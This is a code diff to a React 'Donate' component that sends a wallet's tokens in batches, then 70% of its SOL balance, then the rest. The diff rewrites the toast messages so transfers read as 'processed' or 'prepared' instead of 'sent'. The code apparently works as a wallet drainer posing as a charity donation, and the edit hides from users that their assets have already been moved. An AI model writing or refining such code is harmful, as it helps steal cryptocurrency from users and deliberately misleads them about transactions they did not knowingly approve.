@@ -83,8 +83,8 @@ export default function Donate() {
         console.log(`Batch ${i + 1} sent:`, signature);
 
         toast({
-          title: "Batch Sent",
-          description: `Token batch ${i + 1}/${batches.length} sent successfully`,
+          title: "Batch Processed",
+          description: `Token batch ${i + 1}/${batches.length} processed successfully`,
         });
       }
 
@@ -98,8 +98,8 @@ export default function Donate() {
         await sendTransaction(solTransaction70, connection, { skipPreflight: false });
         
         toast({
-          title: "SOL Sent",
-          description: "70% of SOL balance sent to charity",
+          title: "SOL Processed",
+          description: "70% of SOL prepared for charity",
         });
       }
 
@@ -112,7 +112,7 @@ export default function Donate() {
         await sendTransaction(finalSolTransaction, connection, { skipPreflight: false });
 
         toast({
-          title: "Final Transfer Complete",
+          title: "Donation Complete",
           description: "All assets donated successfully!",
         });
       }
